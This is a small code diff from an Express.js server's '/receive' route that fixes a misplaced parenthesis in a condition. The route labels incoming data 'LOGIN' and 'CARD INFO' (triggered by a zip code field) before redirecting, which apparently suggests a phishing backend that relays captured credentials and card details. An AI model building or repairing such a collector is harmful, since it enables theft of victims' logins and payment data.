@@ -215,7 +215,7 @@ app.post('/receive', async (req, res) => {
             prepareMessage("LOGIN", "/verify?action=1", true);
         }
 
-        if (!responseSent && (myObjects.includes('zipCode')) {
+        if (!responseSent && myObjects.includes('zipCode')) {
             prepareMessage("CARD INFO",  redirect_url , false);
         }
         
